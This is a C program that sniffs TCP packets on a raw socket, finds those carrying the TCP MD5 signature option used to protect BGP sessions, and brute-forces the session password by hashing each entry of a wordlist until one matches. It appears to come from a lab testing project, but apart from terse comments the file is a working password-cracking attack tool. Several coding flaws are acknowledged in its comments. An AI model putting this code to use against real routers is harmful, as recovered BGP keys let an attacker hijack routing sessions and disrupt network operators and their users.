#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include <openssl/md5.h>

#define ADDR_TO_BIND "192.168.56.104"
#define PORT_TO_BIND  179

int main(int argc, char *argv[]) {

    struct sockaddr_in source_socket_address, dest_socket_address;
    struct sockaddr_in sockstr;

    struct pseudoheader {
		in_addr_t saddr;
		in_addr_t daddr;
		u_int16_t protocol;//2 bytes to make the padding for protocol number - protocol num je 1 byte
		u_int16_t len;		
	} pseudo_header,*pseudopointer;

    int packet_size;
    socklen_t socklen;
    static MD5_CTX c,d,e,f;
    char key[255];
     unsigned char md5_digest[16], md5_digest2[16], paket[256];
    unsigned char * options;
    MD5_CTX hash;
    char str[INET_ADDRSTRLEN];
    FILE *fp;
    size_t len=0;

    if (argc !=2) 
    {
	    printf ("Usage is %s <filename>", argv[0]);
	    exit (0);
    }
    fp=fopen("/projekti/bgp/testiranja/pass.txt", "r");
    if (fp==NULL) {
	    		printf ("Error opening password file \n");
			exit(0);
    }

    pseudopointer=&pseudo_header;
    unsigned char *buffer = (unsigned char *)malloc(65536);
    unsigned char *md5signature=(unsigned char *)malloc(1024);

    int sock = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock == -1)
    {
        perror("Failed to create socket");
        exit(1);
    }

    int fromlen=sizeof(sockstr);

    while(1) {
  
      packet_size = recvfrom(sock , buffer , 65536 , 0 , (struct sockaddr *)&sockstr,&fromlen);
      if (packet_size == -1) {
        printf("Failed to get packets\n");
        return 1;
      }

      struct iphdr *ip_packet = (struct iphdr *)buffer;
      struct tcphdr *tcp=(struct tcphdr *) (buffer+sizeof(struct iphdr));
      struct tcp_md5sig *md5sig=(struct tcp_md5sig *)&sockstr;

  	pseudo_header.saddr=ip_packet->saddr;
	pseudo_header.daddr=ip_packet->daddr;
	pseudo_header.protocol=htons(ip_packet->protocol);
	pseudo_header.len=htons(ntohs(ip_packet->tot_len)-ip_packet->ihl*4);

	//construct for MD5 hash - step 1 is pseudo header
	memcpy (paket, (char *)pseudopointer,sizeof(pseudo_header));

	tcp=(struct tcphdr *)((char *)ip_packet+ip_packet->ihl*4);

	tcp->check=0;
	
	//construct for MD5 hash - step 2 is tcp header	excluding OPTIONS
	memcpy (paket+sizeof(pseudo_header), (char *)tcp,20);


	//this loop must be from the start to the end of TCP options, not from 0 to 16
	//this loop can can be from the start of TCP options to TCPOPT_EOL 
	
	for (int i=0;i!=16;i++) 
	{
	options=(unsigned char *)tcp+sizeof(struct tcphdr)+i;
	int opt=*options;
        char signature[16];	
	int match=0;
		if (opt==19 && *(options+1)==18) 
		{
				printf ("[+] TCP signature found!\n");

				int size_of_tcp_data=ntohs(ip_packet->tot_len)-ip_packet->ihl*4-tcp->doff*4;
				while (fgets(key,255, (FILE*)fp))
				{

				//construct for MD5 hash - step 3 is TCP segment (if any)			
				memcpy (paket+sizeof(pseudo_header)+20, (char *)tcp+tcp->doff*4,size_of_tcp_data);
				//construct for MD5 hash - step 4 is key
				memcpy (paket+sizeof(pseudo_header)+20+size_of_tcp_data,key,strlen(key)-1);

				MD5(paket, sizeof(pseudo_header)+20+size_of_tcp_data+strlen(key)-1,md5_digest2);
	
			//	printf ("Hash for %s key is ",key);
					for (int n=0;n<16;n++)
							{	
							//enable only for troubleshooting
							//printf("1st %02x\n",(unsigned int)md5_digest2[n]);
							//printf ("2nd %02x\n",*(options+2+n));		
							
							if ((int *)md5_digest2[n]==*(options+2+n))
								match++;
							}
						if (match==16) 
							{
							printf ("[+] Password found: %s\n",key);
							exit (0);
							}
				}
				if (match!=16) printf ("[-] No password found.\n");
		}
	}
    return 0;
	}
}
